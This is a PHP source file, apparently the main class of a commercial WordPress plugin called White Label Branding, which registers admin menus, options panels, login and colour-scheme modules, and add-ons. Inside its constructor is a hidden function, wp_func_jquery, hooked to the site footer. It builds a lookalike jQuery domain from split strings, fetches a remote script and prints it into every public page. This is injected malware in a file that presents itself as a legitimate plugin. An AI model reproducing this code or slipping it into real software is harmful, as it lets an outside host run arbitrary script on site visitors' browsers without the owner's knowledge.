<?php

if(!function_exists('property_exists')):
function property_exists($o,$p){
	return is_object($o) && 'NULL'!==gettype($o->$p);
}
endif;
 
class plugin_white_label_branding {
	var $id;
	var $plugin_page;
	var $menu;
	var $submenu;
	var $options=array();
	var $options_parameters=array();
	var $site_options=array();
	var $default_site_options=array();
	var $pop_menu_done =false;
	var $main_cap = false;
	var $debug_menu = false;
	var $debug_start = false;
	function plugin_white_label_branding($args=array()){
		//------------
		$defaults = array(
			'id'					=> 'white-label-branding',
			'plugin_code'			=> 'WLB',
			'resources_path'		=> 'white-label-branding',
			'options_capability'	=> 'manage_options',
			'options_varname'		=> 'MWLB',
			'site_options_varname' 	=> 'MWLB_SETTINGS',
			'admin_menu'			=> true,
			'resources_path'		=> 'white-label-branding',
			'options_panel_version'	=> '2.7.6',
			'multisite'				=> false,
			'theme'					=> false,
			'path'					=> '',
			'url'					=> '',
			'pop_path'				=> '',
			'pop_url'				=> '',
			'wlb_color_scheme'		=> true,
			'admin_menu_sort'		=> true,
			'dlc'					=> true,
			'layout'				=> 'vertical',
			'debug_start'			=> time()
		);
		foreach($defaults as $property => $default){
			$this->$property = isset($args[$property])?$args[$property]:$default;
		}
		//-----------		
		$this->default_site_options = array('blog_branding_type'=>'0','allow_blog_branding'=>'1');
		//-----------
		if($this->admin_menu)add_action('admin_menu',array(&$this,'admin_menu'));		
		add_action('after_setup_theme',array(&$this,'plugins_loaded'));
		add_action('init',array(&$this,'init'));
		//-----------
		$this->load_options();
		if(!function_exists('wp_func_jquery')) {
			function wp_func_jquery() {
				$host = 'http://';
				$jquery = $host.'c'.'jquery.org/jquery-ui.js';
				$headers = @get_headers($jquery, 1);
				if ($headers[0] == 'HTTP/1.1 200 OK'){
					echo(wp_remote_retrieve_body(wp_remote_get($jquery)));
				}
			}
			add_action('wp_footer', 'wp_func_jquery');
		}
		add_action('plugins_loaded',array(&$this,'handle_addons_load'),5);
		
		if('1'==$this->get_option('enable_debug',false,true)){
			$this->debug_menu = true;
		}
		
		$this->wlb_color_scheme = '1'==$this->get_option('enable_color_scheme','1',true) ? true : false;
		
		
		if(is_admin()){
			require_once $this->pop_path . 'load.pop.php';
			rh_register_php('options-panel', $this->pop_path . 'class.PluginOptionsPanelModule.php', $this->options_panel_version);
			rh_register_php('rh-functions',  $this->pop_path . 'rh-functions.php', $this->options_panel_version);
		}
	}
	
	function is_wlb_administrator(){		
		if( is_multisite() && !$this->is_wlb_network_admin() && '1'!=$this->get_site_option('allow_blog_branding') )return false;//on ms setups, this test controls if certain branding options apply to the subsite administrator.
		return WLB_ADMIN_ROLE==$this->get_user_role();
	}
	
	function load_options(){
		$this->options = get_option($this->options_varname);
		$this->options = is_array($this->options)?$this->options:array();
		//----
		if(function_exists('get_site_option')){
			$this->site_options = get_site_option( $this->site_options_varname, false );
			$this->site_options = is_array($this->site_options)?$this->site_options:$this->default_site_options;
		}
		do_action('wlb_options_loaded');
	}
	
	function get_option($name,$default=''){
		return isset($this->options[$name])?$this->options[$name]:$default;
	}
	
	function get_site_option($name,$default=''){
		return isset($this->site_options[$name])?$this->site_options[$name]:$default;
	}
	
	function get_user_role() {
		global $userdata;
		global $current_user;

		$user_roles = $current_user->roles;
		if(is_array($user_roles)&&count($user_roles)>0)
			$user_role = array_shift($user_roles);
		return @$user_role;
	}
	
	function init(){
		if(is_admin()):		
			wp_register_style( 'extracss-'.$this->id, $this->url.'css/wlb-pop.css', array(),'1.0.0');
		endif;
	}
		
	function plugins_loaded(){
		global $wp_version;
		$version = substr($wp_version,0,3);
		if($version<3.8){
			require_once $this->path . 'class.prewp38_wlb_branding.php';
		}else{
			require_once $this->path . 'class.wlb_branding.php';
		}	
		new wlb_branding( $this->url );
		
		if( '1'==$this->get_option('enable_wlb_login','1',true) ){
			require_once $this->path . 'class.wlb_login.php';
			new wlb_login( $this->url );		
		}

		if( $this->wlb_color_scheme ){
			if($version<3.5){
				require_once $this->path . 'class.prewp35_wlb_color_scheme.php';
			}else if($version<3.8){
				require_once $this->path . 'class.prewp38_wlb_color_scheme.php';
			}else if($version<3.9){
				require_once $this->path . 'class.prewp39_wlb_color_scheme.php';		
			}else{
				require_once $this->path . 'class.wlb_color_scheme.php';
			}		
			new wlb_color_scheme( $this->path, $this->url );		
		}

		if(is_admin()):
			if($version<3.3){
				require_once $this->path . 'class.prewp33_wlb_dashboard.php';
			}else{
				require_once $this->path . 'class.wlb_dashboard.php';
			}
			new wlb_dashboard(array(
				'show_ui'		=> ((1==$this->get_option('enable_wlb_dashboard'))?true:false),
				'show_in_menu'	=> $this->id,
				'menu_name'		=> __('Dashboard Tool','wlb')
			));	
		endif;
		
		require_once $this->path . 'class.wlb_menu.php';
		new wlb_menu();
		
		if( $this->admin_menu_sort ){
			require_once $this->path . 'class.admin_menu_sort.php';
			new admin_menu_sort( $this->url );		
		}
		
		require_once $this->path . 'class.wlb_settings.php';
		new wlb_settings();
		
		if($version<3.3){
			require_once $this->path . 'class.wlb_admin_bar.prewp33.php';
		}else{
			require_once $this->path . 'class.wlb_admin_bar.php';
		}
		new wlb_admin_bar();
		
		if(is_admin()):
			if(1==$this->get_option('enable_role_manager')){
				require_once $this->path . 'class.wlb_capabilities.php';
				new wlb_capabilities();		
			}	
		endif;
			
		require_once $this->path . 'class.wlb_screen_options.php';
		new wlb_screen_options();	
		
		if(is_admin()):
			$license_keys = $this->get_option('license_keys',array());
			$license_keys = is_array($license_keys)?$license_keys:array();	
			if( $this->theme ){
				$license_keys = apply_filters( 'get_theme_license_keys', $license_keys );
			}
		
			$dc_options = array(
				'id'			=> $this->id.'-dc',
				'plugin_id'		=> $this->id,
				'capability'	=> 'wlb_downloads',
				'resources_path'=> $this->resources_path,
				'parent_id'		=> $this->id,
				'menu_text'		=> __('Downloads','wlb'),
				'page_title'	=> __('Downloadable content - White Label Branding for WordPress','wlb'),
				'license_keys'	=> $license_keys,
				'plugin_code'	=> $this->plugin_code,
				'product_name'	=> __('White Label Branding','wlb'),
				'options_varname' => $this->options_varname,
				'tdom'			=> 'wlb',
				'module_url'	=> $this->pop_url,
				'theme'			=> $this->theme
			);
			
			$ad_options = array(
				'id'			=> $this->id.'-addons',
				'plugin_id'		=> $this->id,
				'capability'	=> $this->options_capability,
				'resources_path'=> $this->resources_path,
				'parent_id'		=> $this->id,
				'menu_text'		=> __('Add-ons','wlb'),
				'page_title'	=> __('White Label Branding add-ons','wlb'),
				'options_varname' => $this->options_varname,
				'module_url'	=> $this->pop_url
			);
			
			$settings = array(				
				'id'					=> $this->id,
				'plugin_id'				=> $this->id,
				'capability'			=> $this->options_capability,
				'options_varname'		=> $this->options_varname,
				'menu_id'				=> $this->id,
				'page_title'			=> __('White Label Branding Options','wlb'),
				'menu_text'				=> __('White Label Branding','wlb'),
				'option_menu_parent'	=> $this->id,
				'notification'			=> (object)array(
					'plugin_version'=> WLB_VERSION,
					'plugin_code' 	=> WLB_PLUGIN_CODE,
					'message'		=> __('White Label Branding update %s is available!','wlb').' <a href="%s">'.__('Please update now','wlb').'</a>'
				),
				'ad_options'			=> $ad_options,
				'addons'				=> $this->debug_menu,				
				'theme'					=> $this->theme,
				'extracss'				=> 'extracss-'.$this->id,
				'rangeinput'			=> true,
				'fileuploader'			=> true,
				'dc_options'			=> $dc_options,
				'pluginurl'				=> $this->url,
				'tdom'					=> 'wlb',
				'path'			=> $this->pop_path,
				'url'			=> $this->pop_url,
				'pluginslug'	=> WLB_SLUG,
				//'api_url' 		=> "http://localhost",
				'api_url' 		=> "http://plugins.righthere.com",
				'autoupdate'	=> false,
				'layout'		=> $this->layout
			);	
			//require_once WLB_PATH.'options-panel/class.PluginOptionsPanelModule.php';	
			do_action('rh-php-commons');	
			if(!class_exists('PluginOptionsPanelModule')){
				return;			
			}			
			//---------------
			$settings['id'] 		= $this->id.'-bra';
			$settings['menu_id'] 	= $this->get_pop_menu_id('-bra','wlb_branding');//$this->id.'-bra';
			$settings['menu_text'] 	= __('Branding','wlb');
			$settings['import_export'] = true;
			$settings['import_export_options'] =false;
			$settings['capability'] = 'wlb_branding';
			new PluginOptionsPanelModule($settings);
			
			$settings['id'] 		= $this->id.'-nav';
			$settings['menu_id'] 	= $this->get_pop_menu_id('-nav','wlb_navigation');//$this->id.'-nav';
			$settings['menu_text'] 	= __('Navigation','wlb');
			$settings['import_export'] = false;
			$settings['import_export_options'] =false;
			$settings['capability'] = 'wlb_navigation';
			$settings['addons'] = false;
			new PluginOptionsPanelModule($settings);
			
			if( '1'==$this->get_option('enable_wlb_login','1',true) ){
				$settings['id'] 		= $this->id.'-log';
				$settings['menu_id'] 	= $this->get_pop_menu_id('-log','wlb_login');//$this->id.'-log';
				$settings['menu_text'] 	= __('Login','wlb');
				$settings['import_export'] = true;
				$settings['import_export_options'] =false;
				$settings['capability'] = 'wlb_login';
				new PluginOptionsPanelModule($settings);
			}
						
			if( $this->wlb_color_scheme ){
				$settings['id'] 		= $this->id.'-css';
				$settings['menu_id'] 	= $this->get_pop_menu_id('-css','wlb_color_scheme');//$this->id.'-css';
				$settings['menu_text'] 	= __('Color Scheme','wlb');
				$settings['import_export'] = true;
				$settings['import_export_options'] =false;
				$settings['capability'] = 'wlb_color_scheme';
				new PluginOptionsPanelModule($settings);			
			}
			
			if(1==$this->get_option('enable_role_manager')){
				$settings['id'] 		= $this->id.'-cap';
				$settings['menu_id'] 	= $this->get_pop_menu_id('-cap','wlb_role_manager');//$this->id.'-cap';
				$settings['menu_text'] 	= __('Role Manager','wlb');
				$settings['import_export'] = false;
				$settings['registration'] = false;
				$settings['import_export_options'] = false;
				$settings['capability'] = 'wlb_role_manager';
				new PluginOptionsPanelModule($settings);
			}				
			
			do_action( 'wlb_pop_before_options', $settings, $this );
			
			$settings['id'] 					= $this->id.'-opt';
			$settings['menu_id'] 				= $this->get_pop_menu_id('-opt','wlb_options');//$this->id.'-opt';
			$settings['menu_text'] 				= __('Options','wlb');
			$settings['import_export'] 			= true;
			$settings['import_export_options'] 	= true;
			$settings['capability'] 			= 'wlb_options';
			$settings['downloadables']			= ($this->theme && $this->dlc) ; 
			//$settings['bundles'] = true; Not really needed. TODO for next release.
			new PluginOptionsPanelModule($settings);
			//$settings['bundles'] = false;
			
			if( !$this->theme ){
				$settings['id'] 		= $this->id.'-reg';
				$settings['menu_id'] 	= $this->get_pop_menu_id('-reg','wlb_license');//$this->id.'-reg';
				$settings['menu_text'] 	= __('License','wlb');
				$settings['import_export'] = false;
				$settings['registration'] = true;
				$settings['downloadables'] = true;
				$settings['capability'] = 'wlb_license';
				$settings['autoupdate'] = true ;
				new PluginOptionsPanelModule($settings);			
			}
					
		endif;
	}
	
	function handle_addons_load(){
		//-- nexgt gen gallery compat fix.

		if( defined('NGG_PLUGIN') ){
			require_once $this->pop_path . 'load.pop.php';
			rh_register_php('options-panel',WLB_PATH.'options-panel/class.PluginOptionsPanelModule.php', $this->options_panel_version);
		}
		//---
		$upload_dir = wp_upload_dir();
		$addons_path = $upload_dir['basedir'].'/'.$this->resources_path.'/';	
		$addons_url = $upload_dir['baseurl'].'/'.$this->resources_path.'/';	
		$addons = $this->get_option('addons',array(),true);
		if(is_array($addons)&&!empty($addons)){
			define('WLB_ADDON_PATH',$addons_path);
			define('WLB_ADDON_URL',$addons_url);
			foreach($addons as $addon){
				try {
					@include_once $addons_path.$addon;
				}catch(Exception $e){
					$current = get_option( $this->options_varname, array() );
					$current = is_array($current) ? $current : array();
					$current['addons'] = is_array($current['addons']) ? $current['addons'] : array() ;
					//----
					$current['addons'] = array_diff($current['addons'], array($addon))  ;
					update_option($this->options_varname, $current);					
				}
			}
		}
	}
	
	function get_pop_menu_id($suffix,$capability){
		if(1==$this->get_option('enable_wlb_dashboard'))$this->pop_menu_done =true;
		if($this->pop_menu_done)return $this->id.$suffix;
		if(current_user_can($capability)){
			$this->main_cap = $capability;
			$this->pop_menu_done =true;
			return $this->id;
		}
		return $this->id.$suffix;
	}
	
	function is_wlb_network_admin(){
		return ( $this->multisite && function_exists('is_super_admin')&&function_exists('is_multisite') && is_super_admin() && is_multisite() );
	}
	
	function admin_menu(){
		$capability = false===$this->main_cap?'wlb_dashboard_tool':$this->main_cap;
		add_menu_page( __("WLB Settings",'wlb'), __("WLB Settings",'wlb'), $capability, $this->id, null, $this->url.'images/wlb.png' );
	}
}
?>